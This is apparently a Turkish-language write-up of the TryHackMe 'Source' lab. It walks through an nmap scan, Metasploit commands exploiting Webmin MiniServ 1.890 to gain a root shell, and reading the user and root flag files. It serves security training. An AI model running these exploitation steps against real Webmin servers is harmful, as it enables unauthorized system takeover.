# Source by Tryhackme

<a href="https://tryhackme.com/room/source" rel="nofollow">Odaya Buradan Ulaşabilirsiniz.</a> 

İlk olarak VPN açıp makinayı çalıştırıyourm. 

Bana verdiği IP adresi şu şekilde = 10.10.90.55 (sizde bu farklı olacaktır.)

Şimdi NMAP taraması yapıyorum 

``` namp -sV 10.10.90.55 ```


tarama sonucu şu şekilde;

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-12 08:21 EDT
Nmap scan report for 10.10.90.55
Host is up (0.090s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.58 seconds
```

Burada görüyorum ki 10000 portunda Webmin çalışıyor.

10.10.90.55:10000 şekilince arama yapıyorum tarayıcıda.Burada https şekilnde arama yapmam gerektiğini görüyorum.

https://10.10.90.55:10000 şekilinde arama yapıyorum ve karşıma çıkan uyarıya Advanced kısmından devam diyerek ilerliyorum.

Karşım giriş sayfası çıkıyor.

![Screenshot_1](https://user-images.githubusercontent.com/34964480/90019273-d8f03180-dcb6-11ea-9405-660efed5b2f6.png)

Terminal ekranımda ``` msfconsole ``` komutu ile Metasploit başlatıyorum. Ardından ``` serach miniserv 1.890 ``` komutu ile exploit buluyorum.

![Screenshot_2](https://user-images.githubusercontent.com/34964480/90020558-af380a00-dcb8-11ea-9c6a-4c21a7e3548c.png)

Bulduğum bu exploiti kullanmak için exploit sırasını şeçmem gerekli bunun için ``` use 0 ``` komutunu kullandım.

Şimdi seçeneklere bir göz atalım ```options``` komutu seçenekleri gösterecektir.

![Screenshot_3](https://user-images.githubusercontent.com/34964480/90020879-2077bd00-dcb9-11ea-8745-ed7c0d3258c2.png)

Sırasıyla ;

            1 - set RHOSTS <buraya hedef ip adresi >  bizimki bu şekilde set RHOSTS 10.10.90.55 
            
            2 - set SSL true
            
            3 - set LHOST <buraya kali tun0 ip adresi > <bunu sudo ifconfig komutu ile görebiliriz>
            
            4 - run 
            
![Screenshot_4](https://user-images.githubusercontent.com/34964480/90021772-608b6f80-dcba-11ea-98da-05662f2be10e.png)

Bu aşamadan sonra ```pwd```komutu ile hangi dosya yolunda bulunduğumuzu görebiliriz.   

Dosya yolumuz /usr/share/webmin şeklinde. Bize lazım olan ```uer.txt``` ve ```root.txt```.

İlk olarak ```ls/root``` komutu ile root yoluna bakıyorum ve root.txt burada. ```cat /root/root.txt``` komutu ile root.txt bayrağını elde ediyoruz.

Sonrasında ise ```ls /home``` komutu ile home klasörüne bakıyorum içeride dark klasörü yer alıyor ``` ls /home/dark ``` komutuyla dark klasörüne bakıyorum ve user.txt burada.

Son olarak ```cat /home/dark/user.txt``` komutu ile user.txt bayrağını elde ediyoruz.

###Böylece odayı tamamlamış olduk. Umarım faydalı olmuştur. Bir sonraki yazıda görüşmek üzere.






